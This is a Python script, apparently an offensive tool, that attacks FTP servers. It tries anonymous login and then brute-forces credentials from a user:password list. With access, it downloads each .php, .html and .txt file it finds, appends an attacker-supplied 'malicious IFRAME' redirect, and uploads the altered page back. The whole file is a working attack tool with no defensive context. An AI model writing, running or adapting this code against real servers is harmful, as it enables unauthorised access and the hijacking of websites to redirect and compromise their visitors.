import ftplib
import optparse
import time

def anonLogin(hostname):
    try:
        ftp=ftplib.FTP(hostname)
        ftp.login('anonymous','me@g.com')
        print('[+] '+str(hostname) +' Anonymous Login Succeded !')
        ftp.quit()
        return True
    except Exception as e:
        print(e)
        print('[-] '+ str(hostname)+' FTP anonymous Failed')
        return False

def check(ftp):
    try:
        dirList=ftp.nlst()
        print('[+] Checked Web files')
    except Exception as e:
        print(e)
        dirList=[]
        print('Could not list the directory contents')
        return dirList
    retList=[]
    for fileName in dirList:
        fn=fileName.lower()
        if ('.php' in fn or '.html' in fn or '.txt' in fn  ):
            print('[+] Found Defalt page: '+fileName)
            retList.append(fileName)
    return retList

def attack(username,password,tgthost,redirect):
    ftp=ftplib.FTP(tgthost)
    ftp.login(username,password)
    print('[+] Checking if Web files exist in: '+tgthost)
    defPage=check(ftp)
    print('[+] Trying to inject Iframe in: '+tgthost)
    for defP in defPage:
        injectPage(ftp,defP,redirect)


def injectPage(ftp,page,redirect):
    print('[+] Trying in file: '+page)
    try:
        f=open(page+'.tmp','w')
        ftp.retrlines('RETR '+page,f.write)
        print('[+] Download Page: '+page)
    except Exception as e:
        print(e)
        print('[-] No file Found: '+page)
        return
    try:
        f.write(redirect)
        f.close()
        print('[+] Injected the malicious IFRAME on: '+page)
    except Exception as e :
        print(e)
        return
    try:
        ftp.storlines('STOR '+page,open(page+'.tmp'))
        print('[+] Uploaded Injected Page: '+page)
    except Exception as a:
        print (a)
        print('[-] No Write Permission')


def Brute(hostname,passFile):
    pF=open(passFile,'r')
    for passwd in pF.readlines():
        username=passwd.split(':')[0]
        password=passwd.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: '+ username+'/'+password)
        try:
            ftp=ftplib.FTP(hostname)
            ftp.login(username,password)
            print('[+] FTP Logon Succeeded: '+username+'/'+password)
            ftp.quit()
            return (username,password)
        except Exception as a:
            print(a)
    print('[-] FTP Logon Brute Force Failed')
    return (None,None)

def main():
    parser=optparse.OptionParser('Usage: ftpbruter_final.py -H <target host> -r <redirect page> -f <userpass file>')
    parser.add_option('-H',dest='tgthost',type='string',help='Specify target host')
    parser.add_option('-r',dest='redirect',type='string',help='Specify redirection page')
    parser.add_option('-f',dest='passfile',type='string',help='Specify the password file')
    (options,args)=parser.parse_args()
    tgthost=options.tgthost
    redirect=options.redirect
    passfile=options.passfile
    if tgthost==None or redirect==None or passfile==None:
        print(parser.usage)
        exit(0)
    #for tgt in tgthost:
    username=None
    password=None
    if anonLogin(tgthost)==True:
        username='anonymous'
        password='me@g.com'
        print('[+] Using Anonymous Creds to Attack')
        attack(username,password,tgthost,redirect)
    (username,password)=Brute(tgthost,passfile)
    if (password !=None):
        print('[+] Using creds: '+username+'/'+password+' to attack')
        attack(username,password,tgthost,redirect)    




if __name__=='__main__':
    main()